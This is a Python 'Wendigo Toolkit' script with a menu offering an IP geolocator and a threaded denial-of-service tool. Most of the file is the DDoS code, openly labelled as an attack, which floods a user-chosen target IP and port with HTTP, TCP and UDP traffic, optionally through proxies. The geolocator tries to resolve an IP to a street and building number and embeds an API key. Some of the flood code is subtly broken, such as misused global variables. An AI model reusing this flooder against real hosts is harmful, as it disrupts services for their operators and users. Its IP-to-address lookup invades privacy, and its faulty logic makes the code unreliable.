import colorama
import os
import requests
from colorama import Style, Fore, init

init()

def banner():
    print(Fore.RED + '''
                       ;               ,           
                     ,;                 '.         
                    ;:                   :;        
                   ::                     ::       
                   ::   WENDIGO TOOLKIT   ::     
                   ':                     :        - Made By :
                    :.                    :                     LTH/Made & BL1XX
                 ;' ::                   ::  '                            
                .'  ';                   ;'  '.                         
               ::    :;                 ;:    ::   
               ;      :;.             ,;:     ::   
               :;      :;:           ,;"      ::   
               ::.      ':;  ..,.;  ;:'     ,.;:   
                "'"...   '::,::::: ;:   .;.;""'    
                    '"""....;:::::;,;.;"""         
                .:::.....'"':::::::'",...;::::;.   
               ;:' '""'"";.,;:::::;.'""""""  ':;   
              ::'         ;::;:::;::..         :;  
             ::         ,;:::::::::::;:..       :: 
             ;'     ,;;:;::::::::::::::;";..    ':.
            ::     ;:"  ::::::"""'::::::  ":     ::
             :.    ::   ::::::;  :::::::   :     ; 
              ;    ::   :::::::  :::::::   :    ;  
               '   ::   ::::::....:::::'  ,:   '   
                '  ::    :::::::::::::"   ::       
                   ::     ':::::::::"'    ::       
                   ':       """""""'      ::       
                    ::                   ;:     
                    ':;                 ;:"                   
            -hrr-     ';              ,;'          
                        "'           '"   


              [1] IP GeoLocator | [2] DDoS Attack



                          ''')

def ddos():

    import socket
    import time
    import threading
    import random
    import requests
    from concurrent.futures import ThreadPoolExecutor
    import struct
    import base64
    import codecs
    import colorama
    from colorama import Fore, Back, Style, init
    init(convert=True)

    total_data_sent = 0
    highest_response_time = 0
    active_threads = 0

    def banner():
        print(Fore.RED + '''
            
            ░██████╗██╗░░░██╗░░░░░░██████╗░██████╗░░█████╗░░██████╗
            ██╔════╝██║░░░██║░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔════╝
            ╚█████╗░██║░░░██║█████╗██║░░██║██║░░██║██║░░██║╚█████╗░
            ░╚═══██╗██║░░░██║╚════╝██║░░██║██║░░██║██║░░██║░╚═══██╗
            ██████╔╝╚██████╔╝░░░░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
            ╚═════╝░░╚═════╝░░░░░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
            
            ''')

    def get_user_input():
        print("=== Ultimate DDoS Testing Tool ===")
        target_ip = input("Enter target IP address: ")
        port = int(input("Enter target port: "))
        data_size = int(input("Enter data package size (bytes): "))
        duration = int(input("Enter attack duration (seconds): "))
        thread_count = int(input("Enter number of threads (recommended: 10-100): "))
        proxy = input("Enter proxy (IP:PORT) or leave blank: ")

        print("\nSelect attack method:")
        print("1. HTTP Flood (Layer 7)")
        print("2. TCP Flood (Layer 4 with advanced headers)")
        print("3. UDP Flood (Layer 4 with enhanced payloads)")
        method = int(input("Enter method number (1-3): "))

        return target_ip, port, data_size, duration, thread_count, proxy, method

    def generate_http_headers():
        headers_list = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Referer': 'https://www.google.com/',
                'DNT': '1',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1'
            },
            {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://example.com',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'TE': 'trailers'
            }
        ]
        return random.choice(headers_list)

    def generate_tcp_packet(data_size):
        tcp_header = struct.pack('!HHIIBBHHH',
            random.randint(1024, 65535),
            random.randint(1024, 65535),
            random.randint(0, 4294967295),
            random.randint(0, 4294967295),
            5 << 4,
            random.randint(0, 255),
            8192,
            0,
            0)
        payload = random._urandom(data_size - len(tcp_header))
        return tcp_header + payload

    def generate_udp_packet(data_size):
        protocols = [b'DNS\x00', b'NTP\x00', b'SNMP\x00', b'SSDP\x00']
        header = random.choice(protocols)
        encoded_data = base64.b64encode(random._urandom(data_size // 2))
        payload = header + encoded_data + random._urandom(data_size - len(header) - len(encoded_data))
        return payload

    def http_flood(target_ip, port, data_size, duration, proxy):
        global total_data_sent, highest_response_time, active_threads
        url = f"http://{target_ip}:{port}"
        proxies = {'http': f"http://{proxy}", 'https': f"http://{proxy}"} if proxy else None
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                headers = generate_http_headers()
                start_time = time.time()
                response = requests.get(url, headers=headers, proxies=proxies, timeout=1)
                response_time = (time.time() - start_time) * 1000
                if response_time > highest_response_time:
                    highest_response_time = response_time
                total_data_sent += len(response.content) if response.content else 0
            except:
                pass
        active_threads -= 1

    def tcp_flood(target_ip, port, data_size, duration, proxy):
        global total_data_sent, active_threads
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if proxy:
                    proxy_ip, proxy_port = proxy.split(':')
                    s.connect((proxy_ip, int(proxy_port)))
                    s.sendall(f"CONNECT {target_ip}:{port} HTTP/1.1\r\n\r\n".encode())
                else:
                    s.connect((target_ip, port))
                packet = generate_tcp_packet(data_size)
                s.sendall(packet)
                total_data_sent += len(packet)
                s.close()
            except:
                pass
        active_threads -= 1

    def udp_flood(target_ip, port, data_size, duration, proxy):
        global total_data_sent, active_threads
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = generate_udp_packet(data_size)
                if proxy:
                    proxy_ip, proxy_port = proxy.split(':')
                    s.sendto(packet, (proxy_ip, int(proxy_port)))
                else:
                    s.sendto(packet, (target_ip, port))
                total_data_sent += len(packet)
                s.close()
            except:
                pass
        active_threads -= 1

    def main():
        banner()
        global total_data_sent, highest_response_time, active_threads
        target_ip, port, data_size, duration, thread_count, proxy, method = get_user_input()

        print(f"\nStarting attack..." + (f" Using proxy {proxy}" if proxy else ""))
        start_time = time.time()
        
        threads = []
        methods = [http_flood, tcp_flood, udp_flood]
        for flood_method in methods:
            for _ in range(thread_count):
                active_threads += 1
                t = threading.Thread(target=flood_method, args=(target_ip, port, data_size, duration, proxy))
                threads.append(t)
                t.start()

        while time.time() - start_time < duration:
            mb_sent = total_data_sent / (1024 * 1024)
            packets = total_data_sent / data_size
            elapsed = time.time() - start_time
            pps = packets / elapsed if elapsed > 0 else 0
            print(f"\r[*] Target: {target_ip}:{port} | Packets: {packets:.0f} | Data: {mb_sent:.2f}MB | PPS: {pps:.0f} | Threads: {active_threads} | Response Time: {highest_response_time:.2f}ms", end='', flush=True)
            time.sleep(0.001)

        for t in threads:
            t.join()

        print("\n=== Attack Summary ===")
        print(f"Total Data Sent: {total_data_sent / (1024 * 1024):.2f} MB")
        if method == 1:
            print(f"Highest Server Response Time: {highest_response_time:.2f} ms")
        print(f"Active Threads During Attack: {active_threads}")
        print("Attack completed.")

    if __name__ == "__main__":
        main()



def geolocator():
    # REQUIREMENTS:
    # pip install colorama==0.4.6
    # pip install dnspython==2.7.0
    # pip install opencage==3.1.0
    # pip install requests==2.32.3
    # pip install shodan==1.31.0



    #!/usr/bin/python
    import requests
    import os
    import time
    from platform import system
    from opencage.geocoder import OpenCageGeocode
    import json
    from datetime import datetime

    class colores:
        red="\033[31;1m"

    os.system("clear")
    logo = colores.red + '''
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@#:      .#%#@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@+  :*+-+#@@+    *@@@@@@@@@@@@@@
        @@@@@@@@@@@@--#@@@@      %@@ #@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@#      #@+ @@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@*      #@@.-@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@        @@@ #@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.      @@@ %@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@#     -@@% @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@=     +@@* @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@         *.@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@           #@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.      =@* @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@+      =@# @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.       +@ *@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@         *. @@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@-        :@# #@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@.          =@  @@@@@@@@@@@@@@@
        @@@@@@@@@@@@@%             =% -@@@@@@@@@@@@@@
        @@@@@@@@@@@@@              @@* +@@@@@%@@@@@@@
        @@@@@@@@@@@@@+             @@@- =@@@@.%@@@@@@
        @@@@@@@@@@@@@      =        @@@*     #@@@@@@@
        @@@@@@@@@@@@@@@=        .     *@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    |Made by: xav666vax |
                    |___________________|
                    | Spyrod Version: v4|
                    |___________________|

             '''  

    try:
        print(logo)
        print('[~] Enter the IP: ')
        ip = input('[~] IP: ')
        print(f'[~] Looking up data for: {ip}')
        time.sleep(2)

        api = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"
        data = requests.get(api).json()

        print("\n[~] Basic Information:")
        print("[~] [IP]:", data['query'])
        print("[~] [ISP]:", data.get('isp', 'Not found'))
        print("[~] [Organization]:", data.get('org', 'Not found'))
        print("[~] [AS Number and Organization]:", data.get('as', 'Not found'))

        print("\n[~] Location Information:")
        print("[~] [City]:", data.get('city', 'Not found'))
        print("[~] [Region / State]:", data.get('regionName', 'Not found'))
        print("[~] [Country]:", data.get('country', 'Not found'))
        print("[~] [Continent]:", data.get('continent', 'Not found'))
        print("[~] [Postal Code]:", data.get('zip', 'Not found'))
        print("[~] [Latitude]:", data.get('lat', 'Not found'))
        print("[~] [Longitude]:", data.get('lon', 'Not found'))
        print("[~] [Timezone]:", data.get('timezone', 'Not found'))

        print("\n[~] Network Information:")
        print("[~] [Mobile Network]:", "Yes" if data.get('mobile', False) else "No")
        print("[~] [Proxy/VPN]:", "Yes" if data.get('proxy', False) else "No")
        print("[~] [Hosting/Datacenter]:", "Yes" if data.get('hosting', False) else "No")
        print("[~] [Reverse DNS]:", data.get('reverse', 'Not found'))

        try:
            additional_data = requests.get(f"https://ipapi.co/{ip}/json/").json()
            print("\n[~] Additional Information:")
            print("[~] [Network]:", additional_data.get('network', 'Not found'))
            print("[~] [Version]:", additional_data.get('version', 'Not found'))
            print("[~] [Region Code]:", additional_data.get('region_code', 'Not found'))
            print("[~] [Country Population]:", additional_data.get('country_population', 'Not found'))
            print("[~] [Country Area]:", additional_data.get('country_area', 'Not found'))
            print("[~] [Country Capital]:", additional_data.get('country_capital', 'Not found'))
            print("[~] [Country TLD]:", additional_data.get('country_tld', 'Not found'))
            print("[~] [Country Calling Code]:", additional_data.get('country_calling_code', 'Not found'))
            print("[~] [Languages]:", additional_data.get('languages', 'Not found'))
        except:
            print("\n[~] Could not fetch additional information")

        try:
            geocoder = OpenCageGeocode("588cee3f6bb849e5b820389669e6c3b9")
            results = geocoder.reverse_geocode(data['lat'], data['lon'])

            admin_url = f"https://nominatim.openstreetmap.org/reverse?lat={data['lat']}&lon={data['lon']}&format=json&addressdetails=1"
            admin_headers = {'User-Agent': 'Spyrod/4.0'}
            admin_response = requests.get(admin_url, headers=admin_headers).json()

            if results and len(results):
                address = results[0]
                components = address.get('components', {})
                admin_details = admin_response.get('address', {})

                print("\n[~] Enhanced Location Information:")
                print(f"[~] [Full Address]: {address['formatted']}")
                print(f"[~] [Building Number]: {components.get('house_number', admin_details.get('house_number', 'Not found'))}")
                print(f"[~] [Street]: {components.get('road', admin_details.get('road', 'Not found'))}")
                print(f"[~] [Building Name]: {components.get('building', admin_details.get('building', 'Not found'))}")
                print(f"[~] [Neighborhood/Suburb]: {components.get('suburb', components.get('neighbourhood', admin_details.get('suburb', 'Not found')))}")
                print(f"[~] [District]: {components.get('district', admin_details.get('district', admin_details.get('city_district', 'Not found')))}")
                print(f"[~] [Quarter]: {components.get('quarter', admin_details.get('quarter', admin_details.get('neighbourhood', 'Not found')))}")
                print(f"[~] [Postcode]: {components.get('postcode', admin_details.get('postcode', 'Not found'))}")
                print(f"[~] [Municipality]: {components.get('municipality', admin_details.get('municipality', admin_details.get('city', 'Not found')))}")
                print(f"[~] [Borough]: {components.get('borough', admin_details.get('borough', 'Not found'))}")
                print(f"[~] [Locality]: {components.get('locality', admin_details.get('locality', 'Not found'))}")
                print(f"[~] [City]: {components.get('city', components.get('town', components.get('village', admin_details.get('city', 'Not found'))))}")
                print(f"[~] [County]: {components.get('county', admin_details.get('county', 'Not found'))}")
                print(f"[~] [State/Province]: {components.get('state', admin_details.get('state', 'Not found'))}")
                print(f"[~] [Country]: {components.get('country', admin_details.get('country', 'Not found'))}")

                if 'annotations' in address:
                    annotations = address['annotations']
                    print("\n[~] Location Context:")
                    print(f"[~] [Type]: {annotations.get('type', 'Not found')}")
                    print(f"[~] [What3Words]: {annotations.get('what3words', 'Not found')}")
                    if 'OSM' in annotations:
                        print(f"[~] [OSM URL]: https://www.openstreetmap.org/{annotations.get('OSM', {}).get('url', 'Not found')}")

                    if 'confidence' in address:
                        print(f"[~] [Location Confidence]: {address['confidence']}/10")

        except Exception as e:
            print("\n[~] Could not fetch detailed location information")

    except KeyboardInterrupt:
        print('\nDone.')
        time.sleep(1)
    except Exception as e:
        print(f"\n[~] Error occurred: {str(e)}")

    while True:
        endchoice = input("\n// Done Tracking, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
        if endchoice == 'r':
            os.system('clear')
            os.system('python main.py')
        elif endchoice == 'm':
            os.system('clear')
            exit()
        else:
            print("Invalid option. Please try again.")


def main():
    os.system("python3 -m pip install colorama requests opencage shodan dnspython --user")
    os.system("clear")
    banner()
    choose = input("[~] Please Choose your Tool : ")
    if choose == '1':
        os.system("clear")
        geolocator()
    elif choose == '2':
        os.system("clear")
        ddos()

if __name__ == "__main__":
    main()
